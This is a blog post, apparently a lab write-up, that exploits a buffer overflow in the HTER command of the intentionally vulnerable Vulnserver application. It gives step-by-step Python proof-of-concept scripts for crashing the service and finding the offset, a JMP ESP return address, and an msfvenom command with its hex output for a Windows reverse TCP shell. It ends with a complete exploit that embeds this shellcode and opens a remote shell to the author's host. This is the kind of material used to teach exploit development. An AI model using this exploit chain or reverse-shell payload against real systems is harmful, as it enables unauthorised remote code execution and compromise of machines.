---
layout: post
title: Vulnserver HTER - Vanilla BOF & Character Conversion
date: 2020-03-08 18:00:00
categories: posts
comments: false
en: true
---

# Introduction

### In order to finish with the eccentric cases that vulnserver may offer us, today we will be seeing an odd case of a buffer overflow with a character conversion.

#### The issue itself

##### Due to the character conversion, the received bytes are parsed as expected. Nonetheless, the alphanumeric bytes suffer from no change whatsoever and are not ported as hex. 
For example, if the EIP is overflown with 1000 bytes of A's, the EIP may not reveal 41414141, instead, it will place "AAAAAAAA".

### The basics

##### As with any other vulnerable applicaiton to, so as to achieve a buffer overflow, we shall test it first in order to exploit it, let's try with HTER + long string of bytes.

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

buffer = "HTER " + "A" * 5000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

#### Crash I.

![](/assets/img/HTER/1.png)

##### Gaze at the EIP for a bit, look how instead of converting the sent bytes into hex (41), it just parsed them as how they went dispatched.
##### As there is no pattern available in order to obtain the offset on these scenarios, the best method is to deduce the offset manually with the use of an elimination process.

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

buffer = "HTER " + "A" * 2000 + "B" * 1000 + "C" * 1000

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Crash II.

![](/assets/img/HTER/2.png)

##### As displayed, it appears as now the B's are the culprit for the overflow. After this process was replicated on multiple occasions, it was found for the offset to be 2041.
##### Furthermore, in order to overwrite the EIP, it is needed to cover the extra space that the opcodes commonly occupy, meaning that it is required to send 8 B's, instead of 4.

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

buffer = "HTER " + "A" * 2041 + "BBBBBBBB" + "FF" * 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Crash III.

![](/assets/img/HTER/3.png)

#### Hijacking the execution.

##### As with any other buffer overflow, it is now essential to find an address with a JMP ESP instruction, which will allow us to execute any type of code with no restrictions 
whatsoever.

###### Enumerating the modules.

![](/assets/img/HTER/4.png)

###### Hunting for the required instruction.

##### Now that the vital address has been already acquired, it can't just be placed as we always did, with struct or a hex escape sequence (\x). Instead, it must be placed on 
reverse, just without the aforementioned hexadecimal condition. For example, instead of sending \x41\x49, 4149 is chosen.

![](/assets/img/HTER/5.png)

###### PoC code:

```term
import socket, sys

host = sys.argv[1]

jmpesp = "AF115062" # 625011AF

buffer = "HTER " + "A" * 2041 + jmpesp + "FF" * 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

##### Crash IV.

![](/assets/img/HTER/6.png)

##### Good, as we now have access to execution, the following step would be generating shellcode, but following what was seen on the last crash. In order to make our shellcode 
usable, the format "hex" will be employed.

##### Generating shellcode

```term
root@whitecr0wz:~# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.100.139 LPORT=9000 -f hex -b "\x00" EXITFUNC=thread 
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of hex file: 702 bytes
b8cb420fe4daced97424f45b31c9b1523143120343128320beed114ad770d9b2281553571915071c0aa54370a74e01603c228e87f589e8a606a1c9a984b81d09b4725048f16f9918aae40c8cdfb18c27935495d46456b44bf
e01166ad3391f743007e90f82f3e8d9dafc4724d30e9961d4f0ec9b268cf658544a727afe1924a6feceb32d0cbab069113d14022db69bc4a78cbfc0ec57a1514939de8132e67acadff3f691b7303b29485f4c5a7ac0e6f436
89200338a0959bc74be6b2031fb6aca2205d2c4af5f27ce4a6b22c44175b264b487b4981e116b042ce4fde19a68d1e3d1f1bf82b4f4d53c4f6d42f75f6c24ab57ce1ab78758cbfed75db9db88af18927189e492101091e66f
740ca9aaefae86636c4a8bc8bcb3130b7ef218c38b415406f62c326d9c4bdf0b68e2984f4102f89d0e6cf388dbef0f5593789ebf9b840a81a5b40c5b2c20164dff4fcabe676f4531d667d5159206e2bf2c59098f3cf
root@whitecr0wz:~# 
```

###### Final PoC:

```term
import socket, sys

host = sys.argv[1]

buf = 
"b8cb420fe4daced97424f45b31c9b1523143120343128320beed114ad770d9b2281553571915071c0aa54370a74e01603c228e87f589e8a606a1c9a984b81d09b4725048f16f9918aae40c8cdfb18c27935495d46456b44b
fe01166ad3391f743007e90f82f3e8d9dafc4724d30e9961d4f0ec9b268cf658544a727afe1924a6feceb32d0cbab069113d14022db69bc4a78cbfc0ec57a1514939de8132e67acadff3f691b7303b29485f4c5a7ac0e6f43
689200338a0959bc74be6b2031fb6aca2205d2c4af5f27ce4a6b22c44175b264b487b4981e116b042ce4fde19a68d1e3d1f1bf82b4f4d53c4f6d42f75f6c24ab57ce1ab78758cbfed75db9db88af18927189e492101091e66
f740ca9aaefae86636c4a8bc8bcb3130b7ef218c38b415406f62c326d9c4bdf0b68e2984f4102f89d0e6cf388dbef0f5593789ebf9b840a81a5b40c5b2c20164dff4fcabe676f4531d667d5159206e2bf2c59098f3cf"

jmpesp = "AF115062" # 625011AF

buffer = "HTER " + "A" * 2041 + jmpesp + "90" * 20 + buf + "FF" * 200

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect((host, 9999))

s.send(buffer)

s.close()
```

#### EndGame

![](/assets/img/HTER/7.png)
